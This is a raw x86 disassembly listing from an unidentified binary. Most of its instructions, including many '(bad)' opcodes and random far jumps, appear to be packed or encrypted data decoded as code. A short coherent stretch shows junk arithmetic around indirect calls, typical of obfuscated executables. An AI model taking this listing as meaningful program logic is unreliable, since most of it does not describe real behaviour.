  408b51:	imul   esp,DWORD PTR [edx+0x7d],0xaa96af8e
  408b58:	adc    al,BYTE PTR [ebx]
  408b5a:	cmp    ebp,DWORD PTR [eax+0x746a3be7]
  408b60:	int3   
  408b61:	cdq    
  408b62:	mov    edx,0x9b8110c7
  408b67:	push   ecx
  408b68:	pop    edi
  408b69:	pop    ecx
  408b6a:	shr    DWORD PTR [edi+0x66],1
  408b6d:	(bad)  
  408b6e:	cmp    cl,BYTE PTR [ebx+0x27]
  408b71:	addr16 call 0xd516d41f
  408b77:	mov    dh,0x65
  408b79:	dec    ecx
  408b7a:	dec    ebp
  408b7b:	je     0x408afd
  408b7d:	rol    DWORD PTR [ebx],cl
  408b7f:	xor    BYTE PTR [edx+0x3d],0x9b
  408b83:	sub    bh,BYTE PTR [edx-0x16]
  408b86:	scas   eax,DWORD PTR es:[edi]
  408b87:	push   cs
  408b88:	mov    ds:0xb12b911e,eax
  408b8d:	mov    al,0x47
  408b8f:	xor    al,BYTE PTR [edi-0x74]
  408b92:	shr    DWORD PTR [edx],cl
  408b94:	icebp  
  408b95:	sbb    eax,0xe98367a1
  408b9a:	pop    ebx
  408b9b:	in     eax,dx
  408b9c:	cmp    ecx,ecx
  408b9e:	adc    DWORD PTR [ecx+0x38],0xef38bdfa
  408ba5:	push   es
  408ba6:	rcr    bh,cl
  408ba8:	jl     0x408bc9
  408baa:	xchg   BYTE PTR [edi*4+0x29cfe3ef],ah
  408bb1:	int3   
  408bb2:	xor    BYTE PTR [edx+0x64],dh
  408bb5:	dec    ebp
  408bb6:	imul   ebp,DWORD PTR [edi],0x37
  408bb9:	mov    edi,0x84854e7d
  408bbe:	jne    0x408bb4
  408bc0:	inc    ebp
  408bc1:	xor    eax,0x1a71475e
  408bc6:	dec    ebx
  408bc7:	inc    edi
  408bc8:	xchg   ebx,eax
  408bc9:	inc    eax
  408bca:	hlt    
  408bcb:	les    esp,FWORD PTR [esi-0x1d4f06f7]
  408bd1:	ja     0x408bb1
  408bd3:	and    al,BYTE PTR [esi+edi*2+0x44a8c9b8]
  408bda:	pop    esp
  408bdb:	jnp    0x408c2e
  408bdd:	aam    0xf2
  408bdf:	test   eax,0x37feb992
  408be4:	scas   eax,DWORD PTR es:[edi]
  408be5:	ficom  DWORD PTR [edi]
  408be7:	iret   
  408be8:	push   cs
  408be9:	mov    bh,0xad
  408beb:	inc    esi
  408bec:	mov    dh,0x66
  408bee:	mov    cl,BYTE PTR [ebp+0x168f7586]
  408bf4:	xlat   BYTE PTR ds:[ebx]
  408bf5:	jl     0x408b9c
  408bf7:	push   esp
  408bf8:	dec    ebx
  408bf9:	rcr    DWORD PTR [esi+ebp*4],0xbc
  408bfd:	jns    0x408bcd
  408bff:	mov    ebx,0xd4d95ff1
  408c04:	scas   al,BYTE PTR es:[edi]
  408c05:	xor    BYTE PTR [edi-0x30],al
  408c08:	push   ebp
  408c09:	push   0x9892859d
  408c0e:	adc    al,0x80
  408c10:	ins    BYTE PTR es:[edi],dx
  408c11:	stos   BYTE PTR es:[edi],al
  408c12:	jbe    0x408bde
  408c14:	test   eax,0x530fc2c9
  408c19:	fsubp  st(2),st
  408c1b:	add    al,0x7d
  408c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c1e:	test   DWORD PTR [ecx],eax
  408c20:	push   ebp
  408c21:	je     0x408c9c
  408c23:	fldenv [eax-0x7f30fa92]
  408c29:	inc    ebx
  408c2a:	sub    bh,BYTE PTR [eax-0x5619afac]
  408c30:	scas   eax,DWORD PTR es:[edi]
  408c31:	(bad)  
  408c32:	fimul  WORD PTR [ecx]
  408c34:	imul   esi,DWORD PTR [esi+0x3c36ddce],0x18694eda
  408c3e:	mov    edi,0x110bfad
  408c43:	sub    DWORD PTR [ebx],edi
  408c45:	popa   
  408c46:	shl    BYTE PTR [ebp-0x41d92e14],1
  408c4c:	lods   eax,DWORD PTR ds:[esi]
  408c4d:	sub    BYTE PTR [edi],cl
  408c4f:	loop   0x408bef
  408c51:	push   cs
  408c52:	ds pusha 
  408c54:	out    dx,al
  408c55:	outs   dx,DWORD PTR ds:[esi]
  408c56:	shr    BYTE PTR [ecx+edx*4+0x17],cl
  408c5a:	mov    cs,WORD PTR [edi+0x2aa02017]
  408c60:	mov    ds:0x47f8c801,al
  408c65:	(bad)  [esp+esi*1+0x50]
  408c69:	add    DWORD PTR [esi],edx
  408c6b:	jle    0x408c68
  408c6d:	jmp    0xe5b4ebfe
  408c72:	add    DWORD PTR [edx+0x68],eax
  408c75:	xor    edx,DWORD PTR [edi+0x1c]
  408c78:	push   cs
  408c79:	xor    edx,DWORD PTR [esi+edx*4-0x648d1308]
  408c80:	nop
  408c81:	cmp    eax,0xa3a33e63
  408c86:	xor    BYTE PTR [edx+0x1981dca2],ch
  408c8c:	jmp    0x408caa
  408c8e:	xor    ebp,ebp
  408c90:	imul   edi,eax,0x5369659d
  408c96:	into   
  408c97:	in     al,dx
  408c98:	inc    ebx
  408c99:	daa    
  408c9a:	sbb    dh,BYTE PTR ss:[esi-0x2145e360]
  408ca1:	stc    
  408ca2:	es (bad) 
  408ca4:	sub    eax,0x693adbc8
  408ca9:	sbb    dl,BYTE PTR [esp+esi*1+0x6d]
  408cad:	outs   dx,DWORD PTR ds:[esi]
  408cae:	ror    eax,1
  408cb0:	lahf   
  408cb1:	or     ebx,DWORD PTR [esi]
  408cb3:	aas    
  408cb4:	cmp    DWORD PTR [ecx],eax
  408cb6:	dec    esp
  408cb7:	adc    eax,0x545164c2
  408cbc:	shr    DWORD PTR [edi+0x7c4e7415],cl
  408cc2:	mov    ds:0xb7678e8,eax
  408cc7:	aad    0x77
  408cc9:	adc    ah,al
  408ccb:	or     DWORD PTR [edx-0xa0e98b0],ebx
  408cd1:	jnp    0x408ccf
  408cd3:	add    edi,esp
  408cd5:	dec    eax
  408cd6:	adc    DWORD PTR [ebp+0x1],edi
  408cd9:	pop    edi
  408cda:	inc    esp
  408cdb:	dec    eax
  408cdc:	bound  ebp,QWORD PTR [eax+0x5e96abff]
  408ce2:	push   ds
  408ce3:	push   ss
  408ce4:	xchg   ebx,eax
  408ce5:	dec    edx
  408ce6:	cli    
  408ce7:	xor    DWORD PTR [ebx-0x7d2bb9f4],esi
  408ced:	pushf  
  408cee:	fst    DWORD PTR [esi-0x3f]
  408cf1:	push   eax
  408cf2:	hlt    
  408cf3:	dec    esi
  408cf4:	xchg   DWORD PTR [ebx-0x48],edx
  408cf7:	push   esp
  408cf8:	jg     0x408cf0
  408cfa:	(bad)  
  408cfb:	std    
  408cfc:	sbb    DWORD PTR [eax+0x7eb66230],edx
  408d02:	xchg   DWORD PTR [esi-0x27003e5],ebx
  408d08:	push   esi
  408d09:	or     eax,0x7cdba9f9
  408d0e:	(bad)  
  408d0f:	in     eax,0xbc
  408d11:	dec    edx
  408d12:	repz pop edx
  408d14:	cmp    DWORD PTR ds:0x1aac0891,ecx
  408d1a:	repnz outs dx,DWORD PTR ds:[esi]
  408d1c:	enter  0xf8da,0xb4
  408d20:	mov    ds:0x3adc487d,al
  408d25:	jo     0x408d49
  408d27:	xor    eax,0xceed021c
  408d2c:	mov    ecx,0xa41d5f79
  408d31:	push   ebp
  408d32:	lods   eax,DWORD PTR ds:[esi]
  408d33:	fcmovb st,st(5)
  408d35:	mov    bh,ch
  408d37:	sub    al,0x38
  408d39:	jmp    0x7c40:0x5e5d5da2
  408d40:	aam    0xcf
  408d42:	adc    esi,edi
  408d44:	dec    ebp
  408d45:	adc    DWORD PTR [edi],ebp
  408d47:	clc    
  408d48:	pop    esp
  408d49:	push   esi
  408d4a:	stos   DWORD PTR es:[edi],eax
  408d4b:	pop    ds
  408d4c:	js     0x408d77
  408d4e:	fisubr WORD PTR [ebp+0x71]
  408d51:	inc    ecx
  408d52:	fwait
  408d53:	push   esp
  408d54:	sub    DWORD PTR [eax+0x57895cbb],edi
  408d5a:	fiadd  DWORD PTR [ecx-0x3]
  408d5d:	sbb    edx,eax
  408d5f:	js     0x408dd6
  408d61:	sar    BYTE PTR [ecx+0x25d90844],1
  408d67:	and    eax,DWORD PTR [ecx]
  408d69:	cli    
  408d6a:	nop
  408d6b:	cwde   
  408d6c:	adc    ebp,DWORD PTR [edi+0x36656b8b]
  408d72:	xor    edi,esi
  408d74:	daa    
  408d75:	fwait
  408d76:	add    al,bl
  408d78:	inc    ecx
  408d79:	sar    DWORD PTR [esi],cl
  408d7b:	cmp    al,0x9b
  408d7d:	adc    esi,ecx
  408d7f:	push   eax
  408d80:	push   esi
  408d81:	aas    
  408d82:	jl     0x408d8c
  408d84:	daa    
  408d85:	in     al,dx
  408d86:	std    
  408d87:	and    ch,bl
  408d89:	xchg   ebx,eax
  408d8a:	inc    ebp
  408d8b:	sub    eax,edx
  408d8d:	adc    eax,0x2f66ef40
  408d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d93:	dec    ebx
  408d94:	lea    edi,[esi+edx*1+0x55]
  408d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d99:	add    cl,bh
  408d9b:	inc    edi
  408d9c:	enter  0xf0dd,0x91
  408da0:	shr    BYTE PTR [eax+0x76166575],cl
  408da6:	adc    ebx,ebx
  408da8:	mov    dl,0x62
  408daa:	pushf  
  408dab:	das    
  408dac:	pop    eax
  408dad:	dec    eax
  408dae:	and    bl,cl
  408db0:	lds    eax,FWORD PTR [esi+eiz*4+0x3cd63c40]
  408db7:	push   esp
  408db8:	jmp    0x5030:0x6908bfef
  408dbf:	adc    edi,edx
  408dc1:	stc    
  408dc2:	ins    BYTE PTR es:[edi],dx
  408dc3:	jecxz  0x408d79
  408dc5:	jge    0x408e2f
  408dc7:	cwde   
  408dc8:	mov    ebp,0xf88a81
  408dcd:	cmp    al,0x20
  408dcf:	mov    esp,es
  408dd1:	jmp    0x7816715c
  408dd6:	fmul   DWORD PTR [ebx-0x44]
  408dd9:	clc    
  408dda:	cmp    edx,ebp
  408ddc:	rcr    BYTE PTR [esi-0x479ebd07],1
  408de2:	sbb    al,0xf1
  408de4:	adc    eax,0x3cc1c664
  408de9:	cdq    
  408dea:	and    BYTE PTR [edx],bh
  408dec:	fist   WORD PTR [eax]
  408dee:	inc    esi
  408def:	xor    al,0x0
  408df1:	push   eax
  408df2:	pop    eax
  408df3:	aaa    
  408df4:	imul   eax,ebx,0xe3b798dd
  408dfa:	repz rol bh,1
  408dfd:	out    dx,eax
  408dfe:	mov    ch,BYTE PTR [ecx+0x590edf98]
  408e04:	inc    esp
  408e05:	loope  0x408dc8
  408e07:	and    eax,0x14ca6c77
  408e0c:	and    eax,0x468193dd
  408e11:	imul   edi,esp,0x43
  408e14:	push   ds
  408e15:	test   DWORD PTR [ebx],ebp
  408e17:	mov    esi,0xec6038e5
  408e1c:	call   0x740e8f55
  408e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e22:	(bad)  
  408e23:	div    DWORD PTR [esp+edx*1-0x3f]
  408e27:	(bad)  
  408e28:	out    dx,eax
  408e29:	push   ebx
  408e2a:	mov    ds:0xdb323a2,al
  408e2f:	xchg   esp,eax
  408e30:	sub    al,0x3c
  408e32:	aaa    
  408e33:	push   ecx
  408e34:	pusha  
  408e35:	retf   
  408e36:	call   0x8f189805
  408e3b:	scas   eax,DWORD PTR es:[edi]
  408e3c:	cmc    
  408e3d:	aam    0x33
  408e3f:	fbstp  TBYTE PTR [edi+0x4bf79ecd]
  408e45:	and    eax,DWORD PTR [ecx+0x5e]
  408e48:	add    DWORD PTR [edi*4+0x53641cc9],eax
  408e4f:	ins    BYTE PTR es:[edi],dx
  408e50:	sub    bl,BYTE PTR [eax]
  408e52:	mov    bl,0xc7
  408e54:	loopne 0x408df0
  408e56:	fwait
  408e57:	mov    edi,0x25197a7e
  408e5c:	push   ds
  408e5d:	adc    al,BYTE PTR [eax]
  408e5f:	sbb    ebx,0xc478d3c3
  408e65:	cmp    eax,0xc1f88b01
  408e6a:	or     al,0xdf
  408e6c:	rcl    DWORD PTR [eax-0x69e1aa33],cl
  408e72:	outs   dx,BYTE PTR ds:[esi]
  408e73:	push   ebx
  408e74:	push   es
  408e75:	inc    eax
  408e76:	lods   al,BYTE PTR ds:[esi]
  408e77:	jb     0x408e13
  408e79:	lahf   
  408e7a:	sbb    dh,dl
  408e7c:	sbb    edi,DWORD PTR [ecx-0x7ec79678]
  408e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e83:	pop    ss
  408e84:	pop    esp
  408e85:	retf   
  408e86:	mov    ds:0x24812c99,eax
  408e8b:	lods   eax,DWORD PTR ds:[esi]
  408e8c:	mov    ecx,edx
  408e8e:	das    
  408e8f:	outs   dx,BYTE PTR ds:[esi]
  408e90:	cmp    eax,0x7d59b3ca
  408e95:	xchg   esi,eax
  408e96:	jae    0x408ea1
  408e98:	jnp    0x408ea6
  408e9a:	fwait
  408e9b:	test   ah,cl
  408e9d:	cli    
  408e9e:	jmp    0xb687:0x73be0eae
  408ea5:	ja     0x408e73
  408ea7:	iret   
  408ea8:	in     eax,0x10
  408eaa:	repnz fxch st(3)
  408ead:	add    eax,0x20cc6af
  408eb2:	mov    BYTE PTR [edi],dh
  408eb4:	pushf  
  408eb5:	pop    edx
  408eb6:	pop    ecx
  408eb7:	dec    edi
  408eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eb9:	pop    ds
  408eba:	loope  0x408eac
  408ebc:	xor    al,cl
  408ebe:	xor    DWORD PTR [ecx],esi
  408ec0:	or     dl,BYTE PTR [ebp+eax*1+0x1]
  408ec4:	mov    cl,0x1b
  408ec6:	mov    esi,DWORD PTR [esi+0x41705ca8]
  408ecc:	scas   al,BYTE PTR es:[edi]
  408ecd:	add    eax,0xf338f9c3
  408ed2:	adc    DWORD PTR [edi+0x27706c6b],esi
  408ed8:	cmp    DWORD PTR [edi+eax*8+0x3c],esi
  408edc:	retf   0xb314
  408edf:	test   edi,ebp
  408ee1:	fldenv [eax-0x53]
  408ee4:	hlt    
  408ee5:	iret   
  408ee6:	sti    
  408ee7:	add    edi,DWORD PTR [edx-0x28]
  408eea:	mov    eax,ds:0x8a2151f6
  408eef:	ror    BYTE PTR [ebx],0x97
  408ef2:	adc    al,0xa7
  408ef4:	push   eax
  408ef5:	cdq    
  408ef6:	(bad)  
  408ef7:	and    al,0xe6
  408ef9:	int    0x79
  408efb:	cmp    eax,eax
  408efd:	(bad)  
  408efe:	rcl    bl,cl
  408f00:	ret    0x1313
  408f03:	js     0x408e8f
  408f05:	lahf   
  408f06:	mov    dl,0xc0
  408f08:	iret   
  408f09:	add    bh,BYTE PTR [ebx+0x72f335c6]
  408f0f:	icebp  
  408f10:	pop    ds
  408f11:	pusha  
  408f12:	xchg   esp,eax
  408f13:	mov    ebx,0x53449e10
  408f18:	or     eax,ebp
  408f1a:	and    al,0xb0
  408f1c:	push   es
  408f1d:	sub    eax,DWORD PTR [edi+edx*4-0x1fbd8bb8]
  408f24:	outs   dx,BYTE PTR ds:[esi]
  408f25:	adc    dl,BYTE PTR [ecx-0x1a]
  408f28:	sub    DWORD PTR [eax-0x2fac0443],ebp
  408f2e:	ins    DWORD PTR es:[edi],dx
  408f2f:	imul   edx,DWORD PTR [esi*1+0x6bae3dbb],0xffffffc4
  408f37:	(bad)
  408f3a:	jecxz  0x408ef7
  408f3c:	mov    ecx,0xa114775c
  408f41:	loope  0x408f0d
  408f43:	jmp    0xf1e0:0x1b87cd4f
  408f4a:	fisubr DWORD PTR [ecx]
  408f4c:	aad    0xff
  408f4e:	add    eax,0xc006ede3
  408f53:	jmp    0x408edf
  408f55:	jmp    0x408f9e
  408f57:	pusha  
  408f58:	cmp    esp,DWORD PTR [edx]
  408f5a:	in     eax,dx
  408f5b:	add    al,0x9a
  408f5d:	lahf   
  408f5e:	cdq    
  408f5f:	cmp    al,dl
  408f61:	mov    eax,0xe44d8b27
  408f66:	and    DWORD PTR ds:0x4229be,ecx
  408f6c:	shrd   eax,ecx,0x2
  408f70:	xor    edx,DWORD PTR ds:0x4229aa
  408f76:	shr    ecx,0x2
  408f79:	add    DWORD PTR ds:0x4228ea,0x4c61
  408f83:	mov    ecx,DWORD PTR [ebp-0x20]
  408f86:	xor    edx,DWORD PTR ds:0x4228d2
  408f8c:	mov    edx,DWORD PTR [ebp-0x1c]
  408f8f:	xor    DWORD PTR ds:0x42297e,0xf7e
  408f99:	xor    eax,edi
  408f9b:	shl    ecx,0x1e
  408f9e:	sbb    ecx,DWORD PTR ds:0x42294e
  408fa4:	xor    edx,edx
  408fa6:	cmp    DWORD PTR ds:0x422916,0x0
  408fad:	mov    ecx,0xa46
  408fb2:	mov    DWORD PTR ds:0x4229ce,0x4de7
  408fbc:	mov    DWORD PTR ds:0x42291e,ecx
  408fc2:	jmp    0x409028
  408fc7:	mov    DWORD PTR ds:0x42298a,0x3b5
  408fd1:	jne    0x40900c
  408fd7:	push   DWORD PTR [ebp-0x20]
  408fda:	push   DWORD PTR [ebp-0x1c]
  408fdd:	push   DWORD PTR [ebp-0x10]
  408fe0:	call   DWORD PTR ds:0x42a020
  408fe6:	xor    ecx,ecx
  408fe8:	add    ecx,DWORD PTR ds:0x4228c2
  408fee:	and    DWORD PTR ds:0x4229ae,ecx
  408ff4:	mov    ecx,DWORD PTR ds:0x4228f2
  408ffa:	sub    DWORD PTR ds:0x42292e,ecx
  409000:	add    ecx,DWORD PTR ds:0x4229a6
  409006:	xor    DWORD PTR ds:0x4229a2,ebx
  40900c:	mov    ecx,DWORD PTR ds:0x42298a
  409012:	or     DWORD PTR ds:0x4228f6,ecx
  409018:	adc    ecx,0x6cf8
  40901e:	adc    DWORD PTR ds:0x422962,0xa1e
  409028:	or     eax,edx
  40902a:	cmp    DWORD PTR ds:0x4228e6,0x0
  409031:	mov    DWORD PTR ds:0x42289e,0x3e29
  40903b:	mov    ecx,0x398
  409040:	jmp    0x409109
  409045:	mov    DWORD PTR ds:0x4228e6,0x60d3
  40904f:	mov    DWORD PTR ds:0x4228ce,0x6d23
  409059:	je     0x409087
  40905f:	push   DWORD PTR [ebp-0x14]
  409062:	push   DWORD PTR [ebp-0x1c]
  409065:	push   0x422835
  40906a:	push   DWORD PTR [ebp-0x28]
  40906d:	call   DWORD PTR ds:0x42a024
  409073:	sbb    DWORD PTR ds:0x42293a,0x5600
  40907d:	sub    DWORD PTR ds:0x422942,0x2629
  409087:	add    ecx,0x569a
  40908d:	sub    edx,edx
  40908f:	and    DWORD PTR ds:0x4228c6,edx
  409095:	cmp    DWORD PTR ds:0x4229ae,0x0
  40909c:	mov    DWORD PTR ds:0x42298a,0x14a0
  4090a6:	movzx  edx,BYTE PTR ds:0x42293e
  4090ad:	mov    ecx,0x236d
  4090b2:	jmp    0x409109
  4090b7:	mov    DWORD PTR ds:0x4229ae,ecx
  4090bd:	mov    DWORD PTR ds:0x42292e,0x5874
  4090c7:	jge    0x4090e5
  4090cd:	push   DWORD PTR [ebp-0x28]
  4090d0:	push   DWORD PTR [ebp-0xc]
  4090d3:	call   DWORD PTR ds:0x42a050
  4090d9:	xor    DWORD PTR ds:0x422916,edx
  4090df:	sbb    ecx,0x5177
  4090e5:	mov    ecx,DWORD PTR ds:0x4229e2
  4090eb:	mov    edx,DWORD PTR ds:0x422a62
  4090f1:	sub    ecx,edx
  4090f3:	sub    ecx,DWORD PTR [ecx+edx*1]
  4090f6:	movzx  edx,BYTE PTR ds:0x4229ca
  4090fd:	or     edx,DWORD PTR ds:0x4228d6
  409103:	mov    DWORD PTR ds:0x4229ca,edx
  409109:	lea    eax,[ebp+eax*1-0x4]
  40910d:	mov    DWORD PTR [ebp-0x34],eax
  409110:	mov    eax,DWORD PTR [ebp-0x20]
  409113:	mov    ecx,DWORD PTR [ebp-0x1c]
  409116:	shrd   eax,ecx,0x2
  40911a:	shr    ecx,0x2
  40911d:	mov    ecx,DWORD PTR [ebp-0x20]
  409120:	mov    edx,DWORD PTR [ebp-0x1c]
  409123:	jmp    0x4096ad
  409128:	add    DWORD PTR [edx+0x589575b5],ebp
  40912e:	inc    eax
  40912f:	and    dh,BYTE PTR [ebx-0xa91636b]
  409135:	stc    
  409136:	adc    DWORD PTR [edi+ebp*4+0x3f],esi
  40913a:	push   ss
  40913b:	push   ss
  40913c:	cmp    eax,0xba161604
  409141:	(bad)  
  409142:	inc    esi
  409143:	in     al,0x35
  409145:	hlt    
  409146:	aad    0x71
  409148:	stc    
  409149:	add    DWORD PTR [eax],0x97cf6e7
  40914f:	xchg   esi,eax
  409150:	jae    0x40912d
  409152:	jle    0x409178
  409154:	inc    eax
  409155:	lock pop esi
  409157:	bound  edx,QWORD PTR [ecx]
  409159:	ret    0xd7e0
  40915c:	into   
  40915d:	cmc    
  40915e:	(bad)  
  40915f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409160:	cdq    
  409161:	add    DWORD PTR [esp+ecx*8-0x59],eax
  409165:	mov    dl,0x81
  409167:	mov    ch,0xbc
  409169:	scas   al,BYTE PTR es:[edi]
  40916a:	in     al,0x66
  40916c:	retf   0x6cc9
  40916f:	pop    ss
  409170:	inc    edx
  409171:	mov    edx,0xa2633dd0
  409176:	push   edx
  409177:	and    BYTE PTR [ebp+0x3cf5e6a5],ah
  40917d:	cmc    
  40917e:	dec    edi
  40917f:	shl    DWORD PTR ds:0x7ae88286,1
  409185:	pushf  
  409186:	cmp    BYTE PTR [esi+0x4c],bl
  409189:	cmc    
  40918a:	adc    eax,0x3a9fa0e7
  40918f:	and    DWORD PTR [eax+0x730c4ab2],ebp
  409195:	dec    ecx
  409196:	popa   
  409197:	push   ss
  409198:	call   0xe3f4:0x81fb8bf5
  40919f:	sub    BYTE PTR [edx],bl
  4091a1:	jnp    0x40921a
  4091a3:	add    ch,BYTE PTR [ecx+0x2d6cb10a]
  4091a9:	xor    al,0xe7
  4091ab:	icebp  
  4091ac:	or     DWORD PTR [ecx],edx
  4091ae:	gs es inc ecx
  4091b1:	cli    
  4091b2:	int    0x1
  4091b4:	pusha  
  4091b5:	or     al,0x8b
  4091b7:	call   FWORD PTR [ebx-0x369fc971]
  4091bd:	xor    al,0xf2
  4091bf:	pop    ss
  4091c0:	cmp    eax,0xf6d6a416
  4091c5:	cwde   
  4091c6:	or     DWORD PTR [esi-0x3adb386b],edx
  4091cc:	stos   BYTE PTR es:[edi],al
  4091cd:	nop
  4091ce:	cmp    al,0x25
  4091d0:	and    edx,DWORD PTR [edi+0x14bc3b47]
  4091d6:	imul   eax,DWORD PTR [esi-0x409445c2],0xa5a07841
  4091e0:	(bad)  
  4091e1:	push   ds
  4091e2:	inc    ebp
  4091e3:	adc    dh,bh
  4091e5:	and    DWORD PTR [ebx],edx
  4091e7:	stc    
  4091e8:	jmp    0x8dcc3a75
  4091ed:	mov    ch,0x39
  4091ef:	mov    WORD PTR [eax+0x57],?
  4091f2:	pop    es
  4091f3:	adc    al,0x43
  4091f5:	or     DWORD PTR [ebp+0x6a],ecx
  4091f8:	jne    0x409231
  4091fa:	aaa    
  4091fb:	cmc    
  4091fc:	cmp    eax,0x6d0153de
  409201:	push   ebp
  409202:	and    edx,edi
  409204:	imul   edx,DWORD PTR [edi+eiz*4-0x5283edca],0xb6df3284
  40920f:	test   BYTE PTR [ebx],0xfd
  409212:	fst    QWORD PTR [ebx]
  409214:	jl     0x40926f
  409216:	cld    
  409217:	push   cs
  409218:	mov    ds:0x5ede710c,al
  40921d:	sub    bl,BYTE PTR [edi]
  40921f:	jns    0x40928e
  409221:	push   eax
  409222:	jp     0x409274
  409224:	je     0x409258
  409226:	mov    ah,0x18
  409228:	cmp    BYTE PTR [esi-0x74c8be32],cl
  40922e:	fwait
  40922f:	dec    ecx
  409230:	(bad)  
  409231:	adc    al,0x98
  409233:	pop    ebx
  409234:	scas   al,BYTE PTR es:[edi]
  409235:	push   cs
  409236:	std    
  409237:	mov    dh,0xaf
  409239:	add    eax,0x3cbecad5
  40923e:	and    dl,dl
  409240:	je     0x40921a
  409242:	retf   0x7b1a
  409245:	call   0x1c9f:0x8d3be1e0
  40924c:	test   DWORD PTR [edx-0x13],0xedecb702
  409253:	dec    ebp
  409254:	inc    ebx
  409255:	sbb    DWORD PTR [edi+0x380f37c3],ecx
  40925b:	rol    BYTE PTR [ebx],cl
  40925d:	je     0x40926c
  40925f:	inc    edi
  409260:	call   0x45c3:0x3a79f3d1
  409267:	ret    
  409268:	push   ecx
  409269:	xchg   ebp,eax
  40926a:	pop    ebx
  40926b:	mov    ds:0x70161403,eax
  409270:	sbb    esp,DWORD PTR [edx-0xb353875]
  409276:	mov    bh,0xeb
  409278:	sub    al,0x76
  40927a:	call   0xce3d:0xb3ecbd9d
  409281:	pop    ebp
  409282:	arpl   WORD PTR [esi-0x32],di
  409285:	xchg   ecx,eax
  409286:	test   eax,0x94aafcd1
  40928b:	jp     0x409290
  40928d:	int3   
  40928e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40928f:	imul   ebp,DWORD PTR [ebx-0x3e],0x163f96aa
  409296:	or     esp,edx
  409298:	lea    eax,[eax+0x4207135c]
  40929e:	jb     0x4092e4
  4092a0:	mov    BYTE PTR [ebx],ch
  4092a2:	pop    edi
  4092a3:	add    ah,BYTE PTR [eax+edi*2-0x14bd4623]
  4092aa:	pop    ss
  4092ab:	mov    esp,0x496aaad1
  4092b0:	sbb    dh,BYTE PTR [ebx]
  4092b2:	mov    esi,0xdbe34357
  4092b7:	adc    BYTE PTR [ecx-0x5c352089],al
  4092bd:	xchg   ecx,eax
  4092be:	int    0x65
  4092c0:	jb     0x4092ea
  4092c2:	sti    
  4092c3:	in     ax,dx
  4092c5:	jbe    0x409292
  4092c7:	mov    ds:0x93d37759,al
  4092cc:	mov    eax,DWORD PTR [ecx]
  4092ce:	int3   
  4092cf:	aam    0xe8
  4092d1:	retf   
  4092d2:	cmp    DWORD PTR [esi+0x2a],esp
  4092d5:	popf   
  4092d6:	int3   
  4092d7:	push   0xffffff87
  4092d9:	jmp    0x14a0:0x2bf1c0fd
  4092e0:	dec    eax
  4092e1:	dec    ebp
  4092e2:	icebp  
  4092e3:	out    dx,eax
  4092e4:	inc    ebp
  4092e5:	inc    edi
  4092e6:	pushf  
  4092e7:	jmp    0x1098db47
  4092ec:	and    esi,eax
  4092ee:	into   
  4092ef:	pop    ds
  4092f0:	ins    DWORD PTR es:[edi],dx
  4092f1:	or     edx,DWORD PTR [eax-0x6f]
  4092f4:	mov    edx,0xa4a0e6fd
  4092f9:	repz arpl WORD PTR [ebx],bx
  4092fc:	test   BYTE PTR [ecx],0x7c
  4092ff:	adc    esp,edi
  409301:	mov    dl,0x65
  409303:	in     al,dx
  409304:	and    BYTE PTR [edi+0x50],ch
  409307:	mov    al,0x26
  409309:	scas   eax,DWORD PTR es:[edi]
  40930a:	sub    DWORD PTR [esi],ebx
  40930c:	pusha  
  40930d:	jno    0x4092e5
  40930f:	in     al,dx
  409310:	mov    ecx,0xea4a8f66
  409315:	pshufw mm3,QWORD PTR [ebp-0x75],0xa2
  40931a:	shl    DWORD PTR [edx+0x32],cl
  40931d:	stos   BYTE PTR es:[edi],al
  40931e:	lods   al,BYTE PTR ds:[esi]
  40931f:	ds adc edi,edx
  409322:	out    0xa5,al
  409324:	dec    edi
  409325:	test   al,0x21
  409327:	mov    al,ds:0x5438db96
  40932c:	mov    ebx,es
  40932e:	gs jns 0x409354
  409331:	stc    
  409332:	jns    0x4092ce
  409334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409335:	test   DWORD PTR [edi+edi*4+0x2b122ef3],0x5c8def70
  409340:	in     eax,0x1c
  409342:	pop    ds
  409343:	and    BYTE PTR [esi],ah
  409345:	or     dh,ah
  409347:	pop    ds
  409348:	div    DWORD PTR [ecx+0x4e]
  40934b:	(bad)  
  40934c:	imul   dx,WORD PTR [edi-0x7b],0xce82
  409352:	adc    eax,0x8b710b32
  409357:	das    
  409358:	jb     0x4092fe
  40935a:	lahf   
  40935b:	dec    esp
  40935c:	jae    0x4093bb
  40935e:	clc    
  40935f:	sub    esp,DWORD PTR [edi]
  409361:	inc    eax
  409362:	and    edx,DWORD PTR [edi+ebp*8]
  409365:	daa    
  409366:	mov    al,0x9b
  409368:	add    DWORD PTR [ecx-0x768c6708],0xf4116cc7
  409372:	adc    ah,BYTE PTR [ebp+0x55a6fbfa]
  409378:	xchg   DWORD PTR [edx+0x11],edi
  40937b:	aaa    
  40937c:	sti    
  40937d:	cwde   
  40937e:	ror    DWORD PTR ds:0x1aa38d29,1
  409384:	or     BYTE PTR [esi-0x76],cl
  409387:	ins    DWORD PTR es:[edi],dx
  409388:	mov    edi,0x512ee47d
  40938d:	mov    bl,0x43
  40938f:	mov    eax,0xc735e451
  409394:	pusha  
  409395:	dec    edx
  409396:	mov    WORD PTR [ebx+0xf],ds
  409399:	mov    eax,ds:0x7450c1f9
  40939e:	loope  0x4093d0
  4093a0:	push   eax
  4093a1:	ret    
  4093a2:	ss test eax,0x75cf2c05
  4093a8:	push   esp
  4093a9:	call   0xc319af2
  4093ae:	mov    cl,0x56
  4093b0:	adc    eax,0x6c268dc1
  4093b5:	inc    ebx
  4093b6:	add    esi,DWORD PTR [ebx]
  4093b8:	jp     0x4093f0
  4093ba:	hlt    
  4093bb:	adc    al,0xe1
  4093bd:	je     0x4093b4
  4093bf:	or     edx,eax
  4093c1:	inc    eax
  4093c2:	xor    DWORD PTR [ebp-0x7],esp
  4093c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c6:	out    dx,al
  4093c7:	or     al,0x71
  4093c9:	stc    
  4093ca:	xchg   dh,ah
